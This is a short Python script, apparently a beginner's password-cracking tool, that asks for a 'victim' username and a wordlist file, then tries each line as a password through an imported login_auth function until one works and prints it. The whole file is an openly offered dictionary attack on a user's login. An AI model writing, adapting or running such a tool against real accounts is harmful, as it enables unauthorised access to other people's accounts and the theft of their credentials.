from modules import login_auth
import time
user_n=input('Enter username of victim :-')
upload=input('Enter location of file :- ')
file=open(upload ,'r')

#checking passwords 
def pw_check(pw):
	result=login_auth(username=user_n,password=pw)
	if result== True:
		return pw
	elif pw:
		pw=file.readline()
		pw=pw.rstrip('\n')
		return(pw_check(pw))

pw=file.readline()
pw=pw.rstrip('\n')
res=pw_check(pw)
if res :
	print('Searching...')
	time.sleep(2)
	print('Password is:- ', res)
else:
	print('Password is not in file or user not exist')

